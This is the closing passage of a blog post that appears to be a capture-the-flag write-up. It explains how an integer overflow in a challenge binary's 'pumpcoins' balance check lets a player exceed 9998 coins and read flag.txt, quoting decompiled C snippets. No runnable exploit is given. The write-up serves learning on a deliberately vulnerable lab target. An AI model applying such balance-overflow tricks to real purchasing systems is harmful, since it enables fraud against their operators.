+<p>This is the code where the overflow can be caused, since the way pumpcoins is calculated is, at it’s core <code>pumpcoins = &lt;current pumpcoin value&gt; - &lt;amount to subtract&gt;</code> . Thus, if the amount to subtract is a negative number, which is can be since an overflow can occur here, it ends up adding pumpcoins instead of subtracting from them.</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>.. </span><span style="color:#8fbfdc;">if </span><span>(-</span><span style="color:#cf6a4c;">1 </span><span>&lt; **pumpcoins**) </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>        </span><span style="color:#ffb964;">printf</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">\nCurrent pumpcoins: [</span><span style="color:#7697d6;">%s%d%s</span><span style="color:#99ad6a;">]\n\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_00100e80,(ulong)(uint)(</span><span style="color:#8fbfdc;">int</span><span>)**pumpcoins**);
+</span><span>        </span><span style="color:#ffb964;">printf</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n[-] Not enough pumpcoins for this!\n\n</span><span style="color:#7697d6;">%s</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_0010134a,&amp;DAT_00100e78);
+</span><span>      }
+</span></code></pre>
+<p>This bit of code would stop a ‘purchase’ if there werent enough pumpcoins but it doesn’t revert the ‘transaction’, which leaves the pumpcoin value changed.</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">if </span><span>(</span><span style="color:#cf6a4c;">0x270e </span><span>&lt; **pumpcoins**) </span><span style="color:#8fbfdc;">break</span><span>;
+</span><span>    </span><span style="color:#ffb964;">printf</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n[-] Not enough pumpcoins for this!\n\n</span><span style="color:#7697d6;">%s</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_0010134a,&amp;DAT_00100e78);
+</span><span>  }
+</span><span>  local_48 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_40 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_38 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_30 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_28 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_20 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  local_50 = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./flag.txt</span><span style="color:#556633;">&quot;</span><span>,</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">rb</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(local_50 != (FILE *)</span><span style="color:#cf6a4c;">0x0</span><span>) {
+</span><span>    fgets((</span><span style="color:#8fbfdc;">char </span><span>*)&amp;local_48,</span><span style="color:#cf6a4c;">0x30</span><span>,local_50);
+</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\nCongratulations, here is the code to get your laser:\n\n</span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n\n</span><span style="color:#556633;">&quot;</span><span>,&amp;DAT_00100ee3,
+</span><span>           &amp;local_48);
+</span><span>                    </span><span style="color:#888888;">/* WARNING: Subroutine does not return */
+</span><span>    exit(</span><span style="color:#cf6a4c;">0x16</span><span>);
+</span><span>  }
+</span></code></pre>
+<p>And finally, here is where we get our flag. If we manage to overflow the pumpcoin value to over 9998, and not fall into any of the previous “if”s, (Having pumpcoins under -1, selecting the shovel or having under 9998 pumpcoins), the normal execution flow of the program will get us our flag!</p>
+
+        </div>
+
+        
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Pssst, there&#x27;s more stuff!</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://cat0nis.github.io/cat0log/blog/rsi1/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">CTF Writeup - RSI 1</span>
+                        </a>
+                    </span>
+                
+                
+                    <span class="button next">
+                        <a href="https://cat0nis.github.io/cat0log/blog/entity/">
+                            <span class="button__text">CTF Writeup - Entity</span>&nbsp;
+                            <span class="button__icon">→</span>
+                        </a>
+                    </span>
+                </div>
+        </div>
+    
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
